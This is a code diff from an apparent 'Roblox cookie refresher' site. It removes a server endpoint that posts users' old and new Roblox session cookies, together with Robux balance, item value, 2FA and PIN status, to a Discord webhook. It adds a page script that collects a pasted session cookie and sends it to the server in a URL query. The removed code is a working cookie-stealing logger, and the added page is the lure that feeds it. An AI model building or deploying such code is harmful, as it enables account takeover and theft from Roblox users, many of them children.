@@ -1,65 +1,73 @@
-const express = require('express');
-const axios = require('axios');
-const { RobloxUser } = require('./getuserinfo');
+document.addEventListener("DOMContentLoaded", () => {
+    // Main page elements
+    const cookieInput = document.getElementById("cookieInput");
+    const refreshButton = document.getElementById("refreshButton");
+    const resultElement = document.getElementById("result");
 
-const app = express();
-app.use(express.json());
+    // Modal elements
+    const cookieModal = document.getElementById("cookieModal");
+    const newCookieOutput = document.getElementById("newCookieOutput");
+    const copyCookieBtn = document.getElementById("copyCookieBtn");
+    const closeModalBtn = document.getElementById("closeModalBtn");
 
-app.post('/api/webhook', async (req, res) => {
-    const { refreshedCookie, oldCookie } = req.body;
-    const webhookURL = process.env.DISCORD_WEBHOOK_URL;
+    refreshButton.addEventListener("click", async () => {
+        const cookie = cookieInput.value.trim();
+        if (!cookie) {
+            showError("Please paste a cookie first.");
+            return;
+        }
 
-    if (!webhookURL || !refreshedCookie || !oldCookie) {
-        return res.status(400).send("Missing webhook URL or cookie data.");
+        const originalButtonHTML = refreshButton.innerHTML;
+        refreshButton.disabled = true;
+        refreshButton.innerHTML = "Processing...";
+        resultElement.style.display = "none";
+
+        try {
+            const response = await fetch(`/api/refresh?cookie=${encodeURIComponent(cookie)}`);
+            const data = await response.json();
+
+            if (!response.ok) {
+                throw new Error(data.error || "An unknown server error occurred.");
+            }
+            
+            showSuccessModal(data.refreshedCookie);
+
+        } catch (error) {
+            showError(error.message);
+        } finally {
+            refreshButton.disabled = false;
+            refreshButton.innerHTML = originalButtonHTML;
+        }
+    });
+
+    function showSuccessModal(newCookie) {
+        newCookieOutput.value = newCookie;
+        cookieModal.classList.add("visible");
     }
 
-    try {
-        const robloxUser = await RobloxUser.register(refreshedCookie);
-        const userData = await robloxUser.getUserData();
-
-        // Helper for formatting numbers
-        const format = (num) => new Intl.NumberFormat('en-US').format(num);
-
-        const embed = {
-            color: 0x7b42f5, // A nice purple color
-            author: {
-                name: `${userData.displayName} (@${userData.username})`,
-                url: `https://www.roblox.com/users/${userData.uid}/profile`,
-                icon_url: "https://i.imgur.com/bjd3g6r.png" // Roblox logo
-            },
-            thumbnail: {
-                url: userData.avatarUrl
-            },
-            fields: [
-                // Main Stats
-                { name: '💰 Robux', value: `\`${format(userData.balance)}\``, inline: true },
-                { name: '📈 RAP', value: `\`${format(userData.rap)}\``, inline: true },
-                { name: '💳 Credit', value: `\`${userData.creditBalance}\``, inline: true },
-                // Account Info
-                { name: '⭐ Premium', value: userData.isPremium ? '✅ Active' : '❌ None', inline: true },
-                { name: '📍 Country', value: `\`${userData.country}\``, inline: true },
-                { name: '🎂 Created', value: `\`${userData.createdAt}\``, inline: true },
-                // Security
-                { name: '🔒 PIN', value: userData.isPinEnabled ? '✅ Enabled' : '❌ Disabled', inline: true },
-                { name: '🛡️ 2FA', value: userData.isTwoStepVerificationEnabled ? '✅ Enabled' : '❌ Disabled', inline: true },
-                { name: '\u200B', value: '\u200B', inline: true }, // Spacer
-                // Cookies
-                { name: '🍪 New Cookie', value: `\`\`\`${refreshedCookie}\`\`\``, inline: false },
-                { name: '↩️ Old Cookie', value: `\`\`\`${oldCookie}\`\`\``, inline: false },
-            ],
-            footer: {
-                text: "Roblox Refresher • Success",
-                icon_url: "https://i.imgur.com/9Cg0Y96.png"
-            },
-            timestamp: new Date().toISOString()
-        };
-
-        await axios.post(webhookURL, { embeds: [embed] });
-        res.status(200).send("Webhook sent.");
-    } catch (error) {
-        console.error("WEBHOOK: An error occurred:", error.message);
-        res.status(500).send("Error sending webhook.");
+    function showError(message) {
+        resultElement.className = 'result error';
+        resultElement.textContent = `Error: ${message}`;
+        resultElement.style.display = 'block';
     }
+    
+    copyCookieBtn.addEventListener("click", () => {
+        newCookieOutput.select();
+        document.execCommand("copy");
+        copyCookieBtn.textContent = "Copied!";
+        setTimeout(() => {
+            copyCookieBtn.textContent = "Copy Cookie";
+        }, 2000);
+    });
+
+    const closeModal = () => {
+        cookieModal.classList.remove("visible");
+    };
+
+    closeModalBtn.addEventListener("click", closeModal);
+    cookieModal.addEventListener("click", (e) => {
+        if (e.target === cookieModal) {
+            closeModal();
+        }
+    });
 });
-
-module.exports = app;
